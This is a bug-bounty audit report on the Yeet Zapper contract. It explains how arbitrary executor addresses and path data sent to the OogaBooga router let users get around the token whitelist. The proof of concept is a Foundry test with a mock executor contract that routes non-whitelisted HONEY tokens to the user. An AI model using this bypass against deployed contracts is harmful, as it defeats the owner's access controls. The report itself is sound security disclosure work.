# #41885 \[SC-Insight] Bypass token whitelist

**Submitted on Mar 19th 2025 at 06:23:37 UTC by @trtrth for** [**Audit Comp | Yeet**](https://immunefi.com/audit-competition/audit-comp-yeet)

* **Report ID:** #41885
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-yeet/blob/main/src/contracts/Zapper.sol>
* **Impacts:**

## Description

## Brief/Intro

Using arbitrary path data and executor address with OogaBooga aggregator can allow Zapper's users to bypass token whitelist

## Vulnerability Details

The tokens whitelist in the Zapper contract can be updated by the owner so that users are allowed to zap in, or zap out with the whitelisted tokens.

However, the current integration with OogaBooga aggregator is flawed that the user can use arbitrary path data and executor address, which is calldata passed to OogaBooga Router contract. By using arbitrary path data and executor address, the user can effectively swap input tokens for arbitrary output tokens, which bypasses the token whitelist checks.

Below is the implementation of OogaBooga Router contract to perform a swap. The Router does allow arbitrary external call to executor, which allows users to control the input tokens of the swap.

```solidity
function _swap(swapTokenInfo memory tokenInfo, bytes calldata pathDefinition, address executor, uint32 referralCode)
        internal
        returns (uint256 amountOut)
    {
        // Check for valid output specifications
        require(
            tokenInfo.outputMin <= tokenInfo.outputQuote,
            MinimumOutputGreaterThanQuote(tokenInfo.outputMin, tokenInfo.outputQuote)
        );
        require(tokenInfo.outputMin > 0, MinimumOutputIsZero());
        require(tokenInfo.inputToken != tokenInfo.outputToken, SameTokenInAndOut(tokenInfo.inputToken));

        uint256 balanceBefore = tokenInfo.outputToken.universalBalance();

        // Delegate the execution of the path to the specified OBExecutor
        uint256[] memory amountsIn = new uint256[](1);
        amountsIn[0] = tokenInfo.inputAmount;

@> external call to executor with arbitrary path >>        IOBExecutor(executor).executePath{value: msg.value}(pathDefinition);

        amountOut = tokenInfo.outputToken.universalBalance() - balanceBefore;

        if (referralCode > REFERRAL_WITH_FEE_THRESHOLD) {
            referralInfo memory thisReferralInfo = referralLookup[referralCode];

            if (thisReferralInfo.beneficiary != address(this)) {
                tokenInfo.outputToken.universalTransfer(
                    thisReferralInfo.beneficiary, amountOut * thisReferralInfo.referralFee * 8 / (FEE_DENOM * 10)
                );
            }

            // Takes the fees and keeps them in this contract
            amountOut = amountOut * (FEE_DENOM - thisReferralInfo.referralFee) / FEE_DENOM;
        }
        int256 slippage = int256(amountOut) - int256(tokenInfo.outputQuote);
        if (slippage > 0) {
            amountOut = tokenInfo.outputQuote;
        }
        require(amountOut >= tokenInfo.outputMin, SlippageExceeded(amountOut, tokenInfo.outputMin));

        // Transfer out the final output to the end user
        tokenInfo.outputToken.universalTransfer(tokenInfo.outputReceiver, amountOut);

        emit Swap(
            msg.sender,
            tokenInfo.inputAmount,
            tokenInfo.inputToken,
            amountOut,
            tokenInfo.outputToken,
            slippage,
            referralCode
        );
    }
```

For example:

* The Zapper contract does not whitelist HONEY tokens for zapping.
* There is a user wants to claim rewards in HONEY tokens --> This is not allowed
* The user can bypass the whitelist by using function claimRewardsInToken0 with minOutput = 1 and wanted path data together with executor address so that executor can swap token1 -> HONEY -> HONEY can be sent to the user as long as the 1 wei of token0 is sent to the Router contract

## Impact Details

Breaking Zapper's token whitelist functionality

## References

OogaBooga Router implementation: <https://bartio.beratrail.io/token/0x7bC98B68bCBb16cEC81EdDcEa1A3746Fdc5025A4/contract/code>

## Proof of Concept

## Proof of Concept

* Add the mock contract below to file `test/zapper/ZapOut.t.sol`

```solidity
contract MockExecutor {
  function executePath(bytes memory path) public {
    (address token0, uint amount, address expectedToken, address receiver, uint expectedAmount) = abi.decode(path, (address, uint, address, address,uint));
    IERC20(token0).transfer(msg.sender, amount);
    IERC20(expectedToken).transfer(receiver, expectedAmount);
  }
}
```

* Add the below test to file `test/zapper/ZapOut.t.sol`

```solidity
    function test_bypass_whitelist() public {
      // @audit bypass zap token whitelist

      address token1 = Wbera;

      // disable HONEY
      vm.prank(admin);
      contracts.zapper.updateSwappableTokens(honey, false);

      MockExecutor executor = new MockExecutor();
      
      // treat the mock executor as a liquidity source
      fundWbera(address(executor), 1 ether);
      fundHoney(address(executor), 1 ether);

      // prepare params
      (IZapper.VaultRedeemParams memory vaultParams, IZapper.KodiakVaultUnstakingParams memory islandUnstakingParams)
        = prepareVaultRedeemAndUnstakeParams(moneyBrinter, vaultShares, 100, amount0, amount1, 100, zapper, zapper);

      // swap token0 -> token1 with min output = 1 wei
      // malicious executor with path data to: 
      // 1. send 1 wei of token1 
      // 2. send HONEY token to alice
      IZapper.SingleTokenSwap memory swapInfo = prepareSwapInfo(amount0, 1, 1, address(executor), abi.encode(token1, 1, honey, alice, 1 ether));

      uint honeyBalanceBefore = IERC20(honey).balanceOf(alice);

      zapOutToToken1(alice, swapInfo, islandUnstakingParams, vaultParams, true, "");

      uint honeyBalanceAfter = IERC20(honey).balanceOf(alice);

      assertGt(honeyBalanceAfter, honeyBalanceBefore);
    }
```

* Run the test above and it succeeds. It means that the function `zapOutToToken1()` bypasses the whitelist check for `HONEY` token
